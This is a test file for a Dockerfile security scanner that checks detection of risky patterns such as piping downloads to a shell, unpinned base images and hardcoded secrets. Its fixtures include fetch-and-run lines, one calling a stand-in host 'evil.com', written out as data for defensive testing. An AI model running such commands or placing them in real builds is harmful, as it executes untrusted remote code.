import { describe, it, expect } from "vitest";
import { scanDockerFile, isDockerFile, DOCKERFILE_PATTERNS } from "../dockerfile-scanner.js";

describe("Dockerfile Scanner", () => {
  it("should identify Docker-related filenames", () => {
    expect(isDockerFile("Dockerfile")).toBe(true);
    expect(isDockerFile("Dockerfile.prod")).toBe(true);
    expect(isDockerFile("docker-compose.yml")).toBe(true);
    expect(isDockerFile("docker-compose.yaml")).toBe(true);
    expect(isDockerFile("Containerfile")).toBe(true);
    expect(isDockerFile(".dockerignore")).toBe(true);
    expect(isDockerFile("package.json")).toBe(false);
    expect(isDockerFile("README.md")).toBe(false);
  });

  it("should detect curl piped to bash in Dockerfile", () => {
    const content = 'RUN curl -fsSL https://example.com/install.sh | bash';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(true);
    expect(findings.find((f) => f.rule === "DOCKER_CURL_PIPE")?.severity).toBe("critical");
  });

  it("should detect wget piped to shell", () => {
    const content = 'RUN wget -qO- https://example.com/setup.sh | sh';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(true);
  });

  it("should detect unpinned base images with :latest", () => {
    const content = 'FROM node:latest';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_UNPINNED_BASE")).toBe(true);
  });

  it("should detect FROM without any tag", () => {
    const content = 'FROM ubuntu';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_NO_TAG")).toBe(true);
  });

  it("should not flag pinned images", () => {
    const content = 'FROM node:20-alpine';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_UNPINNED_BASE")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_NO_TAG")).toBe(false);
  });

  it("should detect HTTP ADD source", () => {
    const content = 'ADD https://example.com/file.tar.gz /app/';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_HTTP_SOURCE")).toBe(true);
  });

  it("should detect hardcoded secrets in ENV", () => {
    const content = 'ENV API_KEY=sk-1234567890abcdef';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_SECRETS_BUILD")).toBe(true);
  });

  it("should detect global npm install", () => {
    const content = 'RUN npm install -g some-package';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_NPM_GLOBAL")).toBe(true);
  });

  it("should detect APT no-verify flags", () => {
    const content = 'RUN apt-get install --allow-unauthenticated some-pkg';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(true);
  });

  it("should detect SUID bit setting", () => {
    const content = 'RUN chmod u+s /usr/bin/something';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_SUID")).toBe(true);
  });

  it("should return empty findings for clean Dockerfile", () => {
    const content = [
      "FROM node:20-alpine AS builder",
      "WORKDIR /app",
      "COPY package*.json ./",
      "RUN npm ci --production",
      "COPY . .",
      "EXPOSE 3000",
      'CMD ["node", "index.js"]',
    ].join("\n");
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings).toHaveLength(0);
  });

  it("should include line numbers in findings", () => {
    const content = "FROM node:20\nWORKDIR /app\nRUN curl https://evil.com/x.sh | bash";
    const findings = scanDockerFile(content, "Dockerfile");
    const finding = findings.find((f) => f.rule === "DOCKER_CURL_PIPE");
    expect(finding?.line).toBe(3);
    expect(finding?.file).toBe("Dockerfile");
  });

  it("should have patterns array", () => {
    expect(DOCKERFILE_PATTERNS.length).toBeGreaterThan(5);
    for (const p of DOCKERFILE_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
